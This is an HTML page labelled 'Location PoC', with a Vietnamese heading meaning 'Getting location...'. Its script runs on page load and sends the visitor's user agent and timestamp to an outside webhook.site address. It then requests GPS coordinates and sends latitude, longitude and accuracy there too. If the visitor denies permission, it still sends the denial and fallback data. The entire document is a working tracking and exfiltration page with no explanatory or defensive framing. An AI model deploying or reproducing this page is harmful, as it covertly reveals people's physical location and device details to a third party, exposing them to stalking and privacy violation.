<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Location PoC</title>
</head>
<body>
  <h2>Đang lấy vị trí...</h2>
  <script>
    const webhook = "https://webhook.site/aac873f7-5c2e-4afd-94eb-9944647c8eca";

    function sendToWebhook(data) {
      fetch(webhook, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data)
      })
      .then(() => console.log("Sent:", data))
      .catch(e => console.error("Error:", e));
    }

    // Luôn gửi ít nhất một bản ghi cơ bản
    sendToWebhook({
      status: "init",
      ua: navigator.userAgent,
      time: new Date().toISOString()
    });

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        pos => {
          sendToWebhook({
            status: "gps_success",
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            ua: navigator.userAgent,
            time: new Date().toISOString()
          });
          document.body.innerHTML += "<p>GPS sent!</p>";
        },
        err => {
          sendToWebhook({
            status: "gps_denied",
            error: err.message,
            ua: navigator.userAgent,
            time: new Date().toISOString()
          });
          document.body.innerHTML += "<p>GPS denied, fallback data sent!</p>";
        }
      );
    } else {
      sendToWebhook({
        status: "no_geolocation_api",
        ua: navigator.userAgent,
        time: new Date().toISOString()
      });
    }
  </script>
</body>
</html>
